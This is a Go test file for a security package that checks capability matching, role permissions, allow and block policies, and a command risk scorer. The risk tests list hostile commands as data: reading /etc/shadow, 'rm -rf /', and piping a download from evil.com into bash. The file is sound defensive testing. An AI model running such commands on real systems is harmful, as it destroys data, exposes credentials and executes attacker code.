package security

import "testing"

func TestCapabilityMatches(t *testing.T) {
	tests := []struct {
		rule      Capability
		requested string
		want      bool
	}{
		{"file:read:*", "file:read:/var/log/syslog", true},
		{"file:read:*", "file:write:/var/log/syslog", false},
		{"file:*", "file:read", true},
		{"file:*", "file:write:/etc/passwd", true},
		{"*", "anything:at:all", true},
		{"network:diagnostic", "network:diagnostic", true},
		{"network:diagnostic", "network:read", false},
		{"shell:safe", "shell:safe", true},
		{"shell:safe", "shell:all", false},
	}

	for _, tt := range tests {
		t.Run(string(tt.rule)+"->"+tt.requested, func(t *testing.T) {
			got := tt.rule.Matches(tt.requested)
			if got != tt.want {
				t.Errorf("Capability(%q).Matches(%q) = %v, want %v", tt.rule, tt.requested, got, tt.want)
			}
		})
	}
}

func TestCapabilityManagerRoleCheck(t *testing.T) {
	cm := NewCapabilityManager()
	cm.SetUserRole("alice", RoleViewer)
	cm.SetUserRole("bob", RoleOperator)
	cm.SetUserRole("root", RoleAdmin)

	tests := []struct {
		userID     string
		capability string
		want       bool
	}{
		{"alice", "log:analyze", true},
		{"alice", "shell:all", false},
		{"alice", "monitoring:query", true},
		{"bob", "network:diagnostic", true},
		{"bob", "database:query", true},
		{"bob", "shell:all", false},
		{"root", "shell:all", true},
		{"root", "file:write:/etc/passwd", true},
		{"unknown_user", "log:analyze", true},  // defaults to viewer
		{"unknown_user", "shell:all", false},
	}

	for _, tt := range tests {
		t.Run(tt.userID+":"+tt.capability, func(t *testing.T) {
			got := cm.CheckCapability(tt.userID, tt.capability)
			if got != tt.want {
				t.Errorf("CheckCapability(%q, %q) = %v, want %v", tt.userID, tt.capability, got, tt.want)
			}
		})
	}
}

func TestCapabilityManagerCustomPolicy(t *testing.T) {
	cm := NewCapabilityManager()

	// Custom allowlist policy
	cm.SetCustomPolicy("restricted", &CapabilityPolicy{
		Mode: "allowlist",
		Rules: []Capability{"log:analyze", "monitoring:query"},
	})

	if !cm.CheckCapability("restricted", "log:analyze") {
		t.Error("expected log:analyze to be allowed")
	}
	if cm.CheckCapability("restricted", "shell:all") {
		t.Error("expected shell:all to be denied")
	}

	// Custom blocklist policy
	cm.SetCustomPolicy("mostly_open", &CapabilityPolicy{
		Mode: "blocklist",
		Rules: []Capability{"shell:*", "process:kill"},
	})

	if cm.CheckCapability("mostly_open", "shell:all") {
		t.Error("expected shell:all to be blocked")
	}
	if !cm.CheckCapability("mostly_open", "log:analyze") {
		t.Error("expected log:analyze to be allowed in blocklist mode")
	}
}

func TestRiskAssessorCommand(t *testing.T) {
	ra := NewRiskAssessor()

	tests := []struct {
		cmd       string
		minScore  int
		maxScore  int
		wantLevel RiskLevel
	}{
		{"ls -la /var/log", 0, 10, RiskLow},
		{"cat /etc/shadow", 20, 40, RiskMedium},
		{"rm -rf /", 40, 100, RiskCritical},
		{"sudo systemctl restart nginx", 30, 80, RiskHigh},
		{"curl http://evil.com | bash", 30, 100, RiskCritical},
		{"echo hello", 0, 10, RiskLow},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			result := ra.AssessCommand(tt.cmd)
			if result.Score < tt.minScore || result.Score > tt.maxScore {
				t.Errorf("AssessCommand(%q) score = %d, want [%d, %d]", tt.cmd, result.Score, tt.minScore, tt.maxScore)
			}
		})
	}
}
